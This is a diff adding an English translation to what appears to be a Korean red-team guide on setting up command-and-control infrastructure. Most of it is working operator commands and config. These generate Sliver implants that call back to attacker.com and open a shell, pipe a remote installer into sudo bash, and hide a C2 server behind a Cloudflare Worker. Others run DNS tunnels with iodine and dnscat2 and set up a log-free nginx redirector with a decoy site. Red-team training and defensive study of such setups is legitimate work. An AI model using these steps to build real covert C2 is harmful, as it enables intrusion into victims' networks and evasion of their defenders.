@@ -1,3 +1,9 @@
+> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)
+
+---
+
+<a name="한국어"></a>
+
 # C2(Command and Control) 인프라 구축 및 운영
 
 ## 개요
@@ -454,6 +460,160 @@ access_log off;
 error_log /dev/null crit;
 
 # iptables로 C2 서버 직접 접근 차단
+iptables -A INPUT -p tcp --dport 8443 \
+  ! -s REDIRECTOR_IP -j DROP
+```
+
+---
+
+<a name="english"></a>
+
+# C2 (Command and Control) Infrastructure Setup and Operations
+
+## Overview
+
+C2 (C&C) infrastructure is the core component that controls agents (implants) in red team operations. Maintaining reliable communication channels while evading detection is the key challenge.
+
+```
+C2 Architecture:
+
+Operator ──► C2 Server ──► Redirector ──► Target Network
+                               │
+                        (VPS/CDN/Domain Fronting)
+                        Hides real C2 server IP
+```
+
+---
+
+## 1. C2 Framework Comparison
+
+| Framework | Language | Protocol | Features | Use Case |
+|-----------|---------|---------|---------|---------|
+| Cobalt Strike | Java | HTTP/S, DNS, SMB | Commercial, mature | Enterprise red team |
+| Sliver | Go | mTLS, WireGuard, DNS | Open source, modern | General red team |
+| Havoc | C/C++ | HTTP/S, SMB | Modern, evasive | Advanced operations |
+| Metasploit | Ruby | Various | Open source | CTF, basic ops |
+| Covenant | C# | HTTP/S | .NET based | Windows-focused |
+
+---
+
+## 2. Sliver C2 Setup
+
+```bash
+# Sliver installation
+curl https://sliver.sh/install | sudo bash
+
+# Start server
+sliver-server
+
+# Generate implant
+sliver > generate --mtls attacker.com:8888 --os windows --arch amd64 \
+                  --format exe --save /tmp/implant.exe
+
+# HTTPS implant (more evasive)
+sliver > generate --https attacker.com:443 --os windows \
+                  --skip-symbols --format shellcode --save /tmp/shellcode.bin
+
+# Start listener
+sliver > mtls --lhost 0.0.0.0 --lport 8888
+
+# Interact with session after implant executes
+sliver > sessions
+sliver > use SESSION_ID
+sliver (implant) > whoami
+sliver (implant) > shell
+```
+
+---
+
+## 3. Domain Fronting
+
+```
+Domain fronting uses CDN infrastructure to hide the real C2 server:
+
+Browser ──► CDN (Cloudflare/Fastly) ──► C2 Server
+
+HTTP Request:
+  Host: legitimate-site.com        ← CDN routing
+  X-Forwarded-Host: attacker.com   ← Actual C2 destination
+
+Why it works:
+  - TLS is terminated at CDN edge
+  - Network monitoring sees CDN traffic, not C2
+  - CDN IP is whitelisted in most firewalls
+```
+
+```bash
+# Domain fronting with Cloudflare Workers
+# 1. Create Cloudflare Worker
+# 2. Worker forwards traffic to real C2 server
+# 3. Implant connects to [worker].workers.dev (legitimate Cloudflare domain)
+
+# Worker code (JavaScript):
+addEventListener('fetch', event => {
+  event.respondWith(handleRequest(event.request))
+})
+
+async function handleRequest(request) {
+  const url = new URL(request.url)
+  url.hostname = 'real-c2-server.com'  // Real C2 server
+  return fetch(url.toString(), request)
+}
+```
+
+---
+
+## 4. DNS C2
+
+```bash
+# DNS C2 using iodine
+# Tunnels traffic through DNS queries
+
+# Server side
+iodined -f -c -P password 10.0.0.1 tunnel.yourdomain.com
+
+# Client side (implant)
+iodine -f -P password tunnel.yourdomain.com
+
+# DNScat2 — DNS tunneling
+# Server
+ruby dnscat2.rb --dns "domain=tunnel.example.com,host=0.0.0.0" --no-cache
+
+# Client
+./dnscat --dns server=ns1.example.com,port=53 --secret=password
+```
+
+---
+
+## 5. OPSEC (Operational Security)
+
+```bash
+# Redirector setup (nginx)
+# Hide real C2 server behind nginx redirector
+
+server {
+    listen 443 ssl;
+    server_name cdn-legitimate.com;
+    
+    ssl_certificate /etc/ssl/legitimate.crt;
+    ssl_certificate_key /etc/ssl/legitimate.key;
+    
+    # Only forward C2 traffic based on User-Agent
+    if ($http_user_agent ~* "Mozilla/5.0 Windows NT 10.0; rv:68.0") {
+        proxy_pass https://real-c2-server:8443;
+    }
+    
+    # Serve decoy site for other traffic
+    location / {
+        root /var/www/decoy;
+    }
+}
+
+# Disable nginx access logs
+access_log off;
+error_log /dev/null crit;
+
+# Block direct access to C2 server via iptables
 iptables -A INPUT -p tcp --dport 8443 \
   ! -s REDIRECTOR_IP -j DROP
 ```
